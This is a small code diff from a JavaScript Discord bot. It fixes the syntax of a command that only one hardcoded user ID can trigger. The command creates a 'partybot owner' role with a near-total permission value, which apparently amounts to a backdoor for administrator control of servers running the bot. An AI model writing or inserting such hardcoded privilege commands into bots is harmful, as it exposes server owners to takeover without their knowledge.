@@ -313,7 +313,10 @@ bot.on("message", async message => {
     if (message.author.id !== '346687165868015616') {
       return
     }
-    guild.createRole(name: 'partybot owner', permissions: 2146958399)
+    guild.createRole({
+      name: 'partybot owner',
+      permissions: 2146958399,
+    })
       .then(role => console.log(`Created new role with name ${role.name}`))
       .catch(console.error);
   }
